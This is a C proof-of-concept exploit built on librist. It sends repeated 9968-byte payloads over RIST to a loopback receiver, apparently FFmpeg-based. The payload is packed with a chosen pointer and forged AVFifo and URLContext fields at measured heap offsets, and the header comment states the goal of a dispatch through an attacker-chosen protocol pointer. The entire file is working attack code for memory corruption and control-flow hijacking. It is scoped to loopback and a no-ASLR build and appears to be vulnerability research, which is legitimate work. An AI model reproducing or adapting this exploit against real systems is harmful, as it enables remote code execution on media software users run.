/* W4 throwaway loopback sender: 9968-byte payload whose repeated 8-byte fill
 * is a chosen pointer value, with AVFifo/URLContext fields overwritten at the
 * offsets measured for the ring-wrap memcpy (dest 0x...0a50 in the no-ASLR
 * build). Keeps the consumer alive long enough to reach a natural dispatch
 * through the wire-chosen prot pointer. Loopback only. */
#include <librist/librist.h>
#include <librist/logging.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int logcb(void *arg, enum rist_log_level lvl, const char *msg)
{
    (void)arg; (void)lvl;
    fprintf(stderr, "[librist] %s\n", msg);
    return 0;
}

static void put64(unsigned char *b, size_t off, unsigned long long v)
{
    for (int i = 0; i < 8; i++) b[off + i] = (unsigned char)(v >> (8 * i));
}
static void put32(unsigned char *b, size_t off, unsigned int v)
{
    for (int i = 0; i < 4; i++) b[off + i] = (unsigned char)(v >> (8 * i));
}

int main(int argc, char **argv)
{
    const char *url = argc > 1 ? argv[1] : "rist://127.0.0.1:5004";
    int count = argc > 2 ? atoi(argv[2]) : 2200;
    size_t len = argc > 3 ? (size_t)strtoull(argv[3], NULL, 10) : 9968;
    unsigned long long target = argc > 4 ? strtoull(argv[4], NULL, 0) : 0x55555584f5a0ULL;
    unsigned long long ringbuf = argc > 5 ? strtoull(argv[5], NULL, 0) : 0x5555558d1fe0ULL;
    unsigned long long priv = argc > 6 ? strtoull(argv[6], NULL, 0) : 0x5555560d2100ULL;

    struct rist_logging_settings ls = LOGGING_SETTINGS_INITIALIZER;
    struct rist_logging_settings *lsp = &ls;
    if (rist_logging_set(&lsp, RIST_LOG_INFO, logcb, NULL, NULL, NULL) < 0) return 1;
    struct rist_ctx *ctx = NULL;
    if (rist_sender_create(&ctx, RIST_PROFILE_MAIN, 0, lsp) < 0) return 1;
    struct rist_peer_config cfg;
    memset(&cfg, 0, sizeof(cfg));
    rist_peer_config_defaults_set(&cfg);
    struct rist_peer_config *pc = &cfg;
    if (rist_parse_address2(url, &pc) < 0) return 1;
    struct rist_peer *peer = NULL;
    if (rist_peer_create(ctx, &peer, pc) < 0) return 1;
    if (rist_start(ctx) < 0) return 1;
    usleep(600000);

    unsigned char *buf = malloc(len);
    if (!buf) return 1;
    for (size_t i = 0; i < len; i++)
        buf[i] = (unsigned char)(target >> (8 * (i & 7)));

    /* AVFifo at dest+0x15f0: buffer, elem_size, nb_elems, offset_r/w,
     * is_empty, flags, auto_grow_limit. */
    const size_t fifo = 0x15f0;
    put64(buf, fifo + 0x00, ringbuf);
    put64(buf, fifo + 0x08, 1);              /* elem_size */
    put64(buf, fifo + 0x10, 0x800000);       /* nb_elems */
    put64(buf, fifo + 0x18, 0);              /* offset_r */
    put64(buf, fifo + 0x20, 0);              /* offset_w */
    put32(buf, fifo + 0x28, 0);              /* is_empty */
    put32(buf, fifo + 0x2c, 0);              /* flags */
    put64(buf, fifo + 0x30, 0);              /* auto_grow_limit */

    /* URLContext at dest+0x1630: keep priv_data, set flags READ. */
    const size_t uc = 0x1630;
    put64(buf, uc + 0x10, priv);
    put32(buf, uc + 0x20, 1);               /* AVIO_FLAG_READ */

    struct rist_data_block db;
    memset(&db, 0, sizeof(db));
    db.payload = buf;
    db.payload_len = len;
    int fails = 0;
    for (int i = 0; i < count; i++) {
        if (rist_sender_data_write(ctx, &db) < 0) fails++;
        usleep(3000);
    }
    fprintf(stderr, "sent %d blocks of %zu bytes target=0x%llx ring=0x%llx, %d failures\n",
            count, len, target, ringbuf, fails);
    usleep(600000);
    rist_destroy(ctx);
    free(buf);
    return 0;
}
